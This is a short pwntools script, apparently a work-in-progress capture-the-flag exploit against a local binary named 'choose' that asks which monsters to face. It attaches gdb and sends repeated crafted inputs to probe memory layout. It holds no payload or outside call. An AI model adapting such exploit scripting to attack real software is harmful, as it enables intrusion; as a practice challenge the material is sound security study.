from pwn import *


p = process('./choose')

p.recvuntil("What monsters would you like to face?")


GDB = """
#b *0x8049c66
c
"""
# eax will contain the location of the first enemy
gdb.attach(p, GDB)

# 0xffe1bfe0
# first is a orc to compare
p.sendline("u")
p.sendline("u")
p.sendline("u")

for i in range(10):
    p.sendline("u")

for i in range(11):
    p.sendline("XXCDEFGHIJKL")

for i in range(11):
    p.sendline("F")

for i in range(5):
    p.sendline("F")

p.interactive()
